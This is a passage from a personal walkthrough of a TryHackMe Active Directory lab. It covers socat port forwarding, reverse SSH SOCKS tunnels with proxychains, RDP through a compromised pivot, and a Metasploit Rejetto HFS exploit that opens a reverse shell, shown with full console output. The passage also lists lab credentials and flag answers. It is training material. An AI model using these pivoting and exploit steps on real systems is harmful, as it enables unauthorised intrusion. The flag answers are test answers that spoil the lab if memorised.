C:\>socat TCP4-LISTEN:3389,fork TCP4:[server_ip]:3389
```

Again we would need a firewall rule opened:
```shell-session
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

If we wanted to expose port 80 from our Attackbox so the server can reach it via the PC-1/pivot:
```shell-session
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

__Dynamic Port Forwarding snd SOCKS

If we need to do large scale port forwarding say like port scanning or something, we need to use SOCKS proxy.

To start a dynamic socks proxy we would run this from PC-1/pivot box:
```shell-session
C:\> ssh tunneluser@[attacker_ip] -R 9050 -N
```

The cool thing about this is that we can now use proxychains to send our requests through our compromised pivot PC-1!

You can configure that in /etc/proxychains.conf on the Attackbox.

The very end of that file should have a line:
```
[ProxyList]
socks4       127.0.0.1 9050
```

then just run any command through proxychains like this:
```bash
proxychains <command>
```

## Let's go to town!

Get credentials:
http://distributor.za.tryhackme.com/creds
tracey.turner Password: Letters1974

SSH into PC-1
`ssh za\\tracey.turner@thmjmp2.za.tryhackme.com`

Next we want to get RDP access to the IIS server through this pivot box.

We can use socat in C:\tools\

```shell-session
C:\tools\socat\>socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

Now from the Attackbox we can just use freerdp to get access:
$ xfreerdp /nocert /v:thmjmp2.za.tryhackme.com:13389 /u:tracey.turner  /p:Letters1974

Then we can get the answer:
What is flag 1?
Answer: _THM{SIGHT_BEYOND_SIGHT}


__Tunnelling Complex Exploits__

The THMDC server is running a vulnerable version of Rejetto HFS. Firewall rules restrict the vulnerable port so it can only be viewed from thmjmp2 host. All outbound connections from thmdc are only allowed to machines on the local network. Rejetto exploit requires the Attacker to host a HTTP server tho.

We'll use port forwarding to get past these problems.

We will need 3 ports (SRVPORT, LPORT and RPORT)

We previously setup a tunnel user on the attackbox using:
tunneluser:d4b0mb!

our lateralmovement IP: 10.50.61.196

The whole command would be:
```shell-session
C:\> ssh tunneluser@10.50.61.196 -R 8889:thmdc.za.tryhackme.com:80 -L *:6669:127.0.0.1:6669 -L *:7779:127.0.0.1:7779 -N
```

Then we use metasploit specifying our ports:

```bash
root@ip-10-10-130-81:~# msfconsole
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View missing module options with show missing

msf5 > use rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


[*] Using exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp 
payload => windows/shell_reverse_tcp
msf5 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.comlhost => thmjmp2.za.tryhackme.com
msf5 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf5 exploit(windows/http/rejetto_hfs_exec) > set lport 7779
lport => 7779
msf5 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf5 exploit(windows/http/rejetto_hfs_exec) > set srvport 6669
srvport => 6669
msf5 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(windows/http/rejetto_hfs_exec) > set rport 8889
rport => 8889

msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 127.0.0.1:7779 
[*] Using URL: http://127.0.0.1:6669/wcE7l4aT96QNQ
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /wcE7l4aT96QNQ
[*] Command shell session 1 opened (127.0.0.1:7779 -> 127.0.0.1:42226) at 2022-11-10 06:20:56 +0000
[!] Tried to delete %TEMP%\AGSeifoUBx.vbs, unknown result
[*] Server stopped.


C:\hfs>
```

Then get the flag:

```shell-session
C:\hfs>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\hfs

11/10/2022  04:41 AM    <DIR>          .
11/10/2022  04:41 AM    <DIR>          ..
11/10/2022  06:20 AM    <DIR>          %TEMP%
06/22/2022  02:23 AM                22 flag.txt
08/24/2014  08:18 PM         2,498,560 hfs.exe
               2 File(s)      2,498,582 bytes
               3 Dir(s)  50,099,916,800 bytes free

C:\hfs>type flag.txt
type flag.txt
THM{FORWARDING_IT_ALL}
```

__Questions__
What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS?
Answer: _THM{SIGHT_BEYOND_SIGHT}

What is the flag obtained using the Rejetto HFS exploit on THMDC?
Answer: _THM{FORWARDING_IT_ALL}_


__Conclusion__

There is a lot to take in regarding AD. I do find it interesting that as a Sysadmin for many years so many of the command things I did such as port forwarding are used in these exploits. :) It does make it easier if you have some familiarity with it. 